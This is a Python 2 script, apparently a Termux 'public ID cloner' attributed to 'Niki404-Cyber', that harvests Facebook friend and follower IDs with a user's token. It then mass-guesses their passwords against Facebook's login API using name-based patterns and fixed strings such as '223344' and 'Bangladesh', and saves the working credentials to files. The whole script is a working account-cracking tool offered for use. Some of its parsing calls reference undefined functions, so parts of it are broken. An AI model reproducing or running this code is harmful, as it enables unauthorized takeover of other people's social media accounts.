#coding=utf-8

 

#!/usr/bin/python2

 

#RanaMZ=namtusunahuga

 

try:

 

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

 

    from multiprocessing.pool import ThreadPool

 

except ImportError:

 

    os.system("pip2 install requests")

 

    os.system("python2 your-name.py")

    

os.system("clear")

 

 

 

if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

 

    os.system("apt update && apt install nodejs -y")

 

from requests.exceptions import ConnectionError

 

os.system("git pull")

 

if not os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

 

    os.system("fuser -k 5000/tcp &")

 

    os.system("cd ..... && pip install progress")

 

    os.system("cd ..... && npm install")

 

    os.system("cd ..... && node index.js &")

 

    os.system("clear")

 

    time.sleep(10)

 

elif os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

 

    os.system("fuser -k 5000/tcp &")

 

    os.system("#")

 

    os.system("cd ..... && node index.js &")

 

    os.system("clear")

 

bd=random.randint(2e7, 3e7)

 

sim=random.randint(2e4, 4e4)

 

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

 

reload(sys)

 

sys.setdefaultencoding("utf-8")

 

c = "\033[1;92m"

 

c2 = "\033[0;97m"

 

c3 = "\033[1;91m"

 

logo = """                                

                                                  
\033[1;92m   ╔0═0╗ ♫♪    
\033[1;92m   ║ M ║ ♪♪   
\033[1;92m   ║ r ║♫♪  
\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS BANGLADESH [♫]  
\033[1;92m╔══0═══0═════00o═══════════════════════════╗  
\033[1;92m█ ✯AUTHOR   : Niki404-Cyber                █  
\033[1;92m█ ✯YOUTUBE  : Mr. NIKI                     █  
\033[1;92m█ ✯FACEBOKK : Niki.Cyber404                █  
\033[1;92m█ ✯WHATSAPP : +8801927294533               █   
\033[1;92m█ ✯GITHUB   : Niki404-Cyber                █  
\033[1;92m╚══0═══0═════00o═══════════════════════════╝
\033[1;92m   
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;91m            PUBLIC ID CLONER
\033[1;92m╚═════════════════════════════════════════╝
\033[1;96m-----------------------------------------------

 

"""

 

 

 

def main():

 

    os.system("clear")

 

    print logo

 

    print("")

 

    print("\033[0;96m LETS START ").center(50)

 

    print("")

 

    print("\033[1;91m[1]\033[1;92mSTART CLONiNG....")

 

    print("")

 

    print("\033[1;91m[2]\033[1;92mFOLLOW THE NIKI ")

 

    print("")

 

    print("\033[1;91m[0]\033[1;92mEXIT")

 

    print("")

 

    main_select()

 

def main_select():

 

    Mz = raw_input("\033[1;92m[#] Choose Opition --->\033[1;93m ")

 

    if Mz  =="1":

 

        login()

 

    if Mz =="2":

 

        os.system("xdg-open https://www.facebook.com/NIKI.CYBER404.OFFICIALS")

 

	main()   

    elif Mz =="0":

 

        os.system("exit")

 

    else:

 

        print("[!] Please select a valid option").center(50)

 

        time.sleep(2)

 

        main()

 

def login():

 

    os.system("clear")

 

    print logo

 

    print("")

 

    print("\033[0;92m[ Login Menu ]").center(50)

 

    print("")

 

    print("\033[1;91m[1]\033[1;92mLogin Using Token")

 

    print("")

 

    print("\033[1;91m[2]\033[1;92mHOW TO GET FRE TOKEN.")

 

    print("")

 

    print("\033[1;91m[3]\033[1;92mBack")

 

    print("")

 

    login_select()

 

def login_select():

 

    Mz = raw_input(" \033[1;92m Choose Option :\033[1;92m ")

 

    if Mz =="1":

 

        os.system("clear")

 

        print logo

 

        print("")

 

	print("[ login with token ]").center(50)

 

	print("")

 

        token = raw_input("[!] Token ? \033[0;92m")

 

        token_s = open(".fb_token.txt","w")

 

        token_s.write(token)

 

        token_s.close()

 

        try:

 

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

 

            q = json.loads(r.text)

 

            name = q["name"]

 

            nm = name.rsplit(" ")[0]

 

            print("")

 

            print("\033[1;92mYour token login successfully").center(50)

 

            time.sleep(1)

 

	    os.system("xdg-open https://youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw")

	

 

	    time.sleep(1)

 

            menu()

 

        except (KeyError , IOError):

 

            print("")

 

            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)

 

            print("")

 

            time.sleep(2)

 

            login()

 

    elif Mz =="2":

 

        os.system("xdg-open https://www.facebook.com/Niki.Cyber404")

 

    elif Mz =="3":

 

        main()

 

    else:

 

        print("")

 

        print("Select a valid option").center(50)

 

        print("")

 

        login_select()

 

 

 

 

def menu():

 

    global token

 

    os.system("clear")

 

    print logo

 

    try:

 

        token = open(".fb_token.txt","r").read()

 

    except (KeyError , IOError):

 

        login()

 

    try:

 

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

 

        q = json.loads(r.text)

 

        nm = q["name"]

 

        nmf = nm.rsplit(" ")[0]

 

        ok = nmf

 

    except (KeyError , IOError):

 

        print("")

 

        print("login account has checkpoint").center(50)

 

        print("")

 

        os.system("rm -rf .fb_token.txt")

 

        time.sleep(1)

 

        login()

 

    except requests.exceptions.ConnectionError:

 

        print logo

 

        print("")

 

        print("Your internet connection failed").center(50)

 

        print("")

 

        time.sleep(2)

 

        menu()

 

    os.system("clear")

 

    print logo

 

    print("")

 

    print("\t\033[1;92mActive Token.... : " +nm)

 

    print("")

 

    print("\033[1;91m[1]\033[1;92mCrack From Friendlist")

 

    print("")

 

    print("\033[1;91m[2]\033[1;92mCrack From Public id")

 

    print("")

 

    print("\033[1;91m[3]\033[1;92mCrack From Followers id")

 

    print("")

 

    print("\033[1;91m[0]\033[1;92mEXIT ")

 

    print("")

 

    menu_select()

 

def menu_select():

 

	select = raw_input("\033[1;92m Choose Option : ")

 

	id=[]

 

	oks=[]

 

	cps=[]

 

	if select=="1":

 

		os.system("clear")

 

		print logo

 

		print("")

 

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)

 

		z = json.loads(r.text)

 

		for s in z["data"]:

 

			uid=s['id']

 

			na=s['name']

 

			nm=na.rsplit(" ")[0]

 

			id.append(uid+'='+nm)

 

	if select =="2":

 

		os.system("clear")

 

		print(logo)

 

		print("")

 

		idt = raw_input("\033[1;97m[♫] ATTACK ID :\033[1;96m ")

 

		os.system("clear")

 

		print logo

 

		try:

 

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

 

			q = json.loads(r.text)

 

			print("[!] Target from : "+q["name"])

 

		except (KeyError , IOError):

 

		    print("")

 

		    print("\033[1;91your login account has checkpoint").center(50)

 

		    print("")

 

		    menu()

 

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

 

		z = niki.cyber(r.text)

 

		for i in z["data"]:

 

			uid=i['id']

 

			na=i['name']

 

			nm=na.rsplit(" ")[0]

 

			id.append(uid+'='+nm)

 

	elif select =="3":

 

		os.system("clear")

 

		print logo

 

		print("")

 

		idt = raw_input("\033[1;92m[♫] ATTACK ID :\033[1;92m ")

 

		os.system("clear")

 

		print logo

 

		try:

 

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

 

			q = niki.cyber(r.text)

 

			print(" Target From  : "+q["name"])

 

		except (KeyError , IOError):

 

		    print("")

 

		    print("\033[1;91m login id has checkpoint").center(50)

 

		    print("")

 

		    time.sleep(3)

 

		    menu()

 

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)

 

		z = niki.cyber(r.text)

 

		for i in z["data"]:

 

			uid=i['id']

 

			na=i['name']

 

			nm=na.rsplit(" ")[0]

 

			id.append(uid+'='+nm)

 

	elif select =="0":

 

	    os.system("exit")

 

	else:

 

	    print("")

 

	    print("Please Select A Valid Option").center(50)

 

	    time.sleep(2)

 

	    menu_select()

 

	print("[♫] Total IDs..... : "+str(len(id)))

 

	time.sleep(0.5)

 

	print("[♫] Please Wait A Few Minute.....")

 

	print 47*("-")

 

	print('')

 

	

 

	def main(arg):

 

		user=arg

 

		uid,name=user.split("=")

 

		try:

 

		    pass1=name+"123"

 

		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		    d=nikk.cyber(q)

 

		    if 'www.facebook.com' in d['error_msg']:

 

		        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass1)

 

		        cp=open("nikicp.txt","a")

 

		        cp.write(uid+" = "+pass1+"\n")

 

		        cp.close()

 

		        cps.append(uid)

 

		    else:

 

		    	if "access_token" in d:

 

		            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass1+"\x1b[1;0m")

 

		            ok=open("nikiok.txt","a")

 

		            ok.write(uid+" = "+pass1+"\n")

 

		            ok.close()

 

		            oks.append(uid)

 

		        else:

 

		            pass2=name+"1234"

 

		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		            d=niki.cyber(q)

 

		            if 'www.facebook.com' in d['error_msg']:

 

		                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass2)

 

		                cp=open("nikicp.txt","a")

 

		                cp.write(uid+" = "+pass2+"\n")

 

		                cp.close()

 

		                cps.append(uid)

 

		            else:

 

		                if 'access_token' in d:

 

		                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass2+"\x1b[1;0m")

 

		                    ok=open("nikiok.txt","a")

 

		                    ok.write(uid+" = "+pass2+"\n")

 

		                    ok.close()

 

		                    oks.append(uid)

 

		                else:

 

		                    pass3=name+"12345"

 

		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		                    d=niki.cyber(q)

 

		                    if 'www.facebook.com' in d['error_msg']:

 

		                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass3)

 

		                        cp=open("nikicp.txt","a")

 

		                        cp.write(uid+" = "+pass3+"\n")

 

		                        cp.close()

 

		                        cps.append(uid)

 

		                    else:

 

		                        if 'access_token' in d:

 

		                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass3+"\x1b[1;0m")

 

		                            ok=open("nikiok.txt","a")

 

		                            ok.write(uid+" = "+pass3+"\n")

 

		                            ok.close()

 

		                            oks.append(uid)

 

		                        else:

 

		                            pass4=name+"1122"

 

		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		                            d=niki.cyber(q)

 

		                            if 'www.facebook.com' in d['error_msg']:

 

		                                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass4)

 

		                                cp=open("nikicp.txt","a")

 

		                                cp.write(uid+" = "+pass4+"\n")

 

		                                cp.close()

 

		                                cps.append(uid)

 

		                            else:

 

		                                if 'access_token' in d:

 

		                                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass4+"\x1b[1;0m")

 

		                                    ok=open("nikiok.txt","a")

 

		                                    ok.write(uid+" = "+pass4+"\n")

 

		                                    ok.close()

 

		                                    oks.append(uid)

 

		                                else:

 

		                                    pass5="223344"

 

		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		                                    d=json.loads(q)

 

		                                    if 'www.facebook.com' in d['error_msg']:

 

		                                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass5)

 

		                                        cp=open("nikicp.txt","a")

 

		                                        cp.write(uid+" = "+pass5+"\n")

 

		                                        cp.close()

 

		                                        cps.append(uid)

 

		                                    else:

 

		                                        if 'access_token' in d:

 

		                                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass5+"\x1b[1;0m")

 

		                                            ok=open("nikiok.txt","a")

 

		                                            ok.write(uid+" = "+pass5+"\n")

 

		                                            ok.close()

 

		                                            oks.append(uid)

 

		                                        else:

 

		                                            pass6="445566"

 

		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		                                            d=niki.cyber(q)

 

		                                            if 'www.facebook.com' in d['error_msg']:

 

		                                                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass6)

 

		                                                cp=open("nikicp.txt","a")

 

		                                                cp.write(uid+" = "+pass6+"\n")

 

		                                                cp.close()

 

		                                                cps.append(uid)

 

		                                            else:

 

		                                                if 'access_token' in d:

 

		                                                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass6+"\x1b[1;0m")

 

		                                                    ok=open("nikiok.txt","a")

 

		                                                    ok.write(uid+" = "+pass6+"\n")

 

		                                                    ok.close()

 

		                                                    oks.append(uid)

 

		                                                else:

 

		                                                    pass7="Bangladesh"

 

		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

 

		                                                    d=niki.cyber(q)

 

		                                                    if 'www.facebook.com' in d['error_msg']:

 

		                                                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass7)

 

		                                                        cp=open("nikicp.txt","a")

 

		                                                        cp.write(uid+" = "+pass7+"\n")

 

		                                                        cp.close()

 

		                                                        cps.append(uid)

 

		                                                    else:

 

		                                                        if 'access_token' in d:

 

		                                                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass7+"\x1b[1;0m")

 

		                                                            ok=open("nikiok.txt","a")

 

		                                                            ok.write(uid+" = "+pass7+"\n")

 

		                                                            ok.close()

 

		                                                            oks.append(uid)

 

									

 

															

 

		except:

 

			pass

 

		

 

	p = ThreadPool(30)

 

	p.map(main, id)

 

	print (" ")

 

	print (47*"-")

 

	print ("[!] Process has completed")

 

	print ("[!] Successful Cracking Your Target ID Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))

 

	print (47*"-")

 

	raw_input("\t\x1b[0;92mPress Enter To Main Menu Back")

 

	menu()

 

	

 

if __name__ == '__main__':

 

    main()
